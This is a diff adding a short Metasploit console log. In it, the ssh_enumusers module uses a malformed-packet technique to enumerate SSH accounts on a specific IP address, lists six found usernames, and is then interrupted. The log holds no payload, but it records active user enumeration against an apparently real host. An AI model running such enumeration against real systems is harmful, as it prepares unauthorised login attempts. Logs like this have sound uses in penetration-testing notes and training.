@@ -1,0 +1,13 @@
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
+
+[*] 185.53.1.82:22 - SSH - Using malformed packet technique
+[*] 185.53.1.82:22 - SSH - Starting scan
+[+] 185.53.1.82:22 - SSH - User 'Debian-exim' found
+[+] 185.53.1.82:22 - SSH - User 'adm' found
+[+] 185.53.1.82:22 - SSH - User 'admin' found
+[+] 185.53.1.82:22 - SSH - User 'administrator' found
+[+] 185.53.1.82:22 - SSH - User 'apache' found
+[+] 185.53.1.82:22 - SSH - User 'at' found
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit 
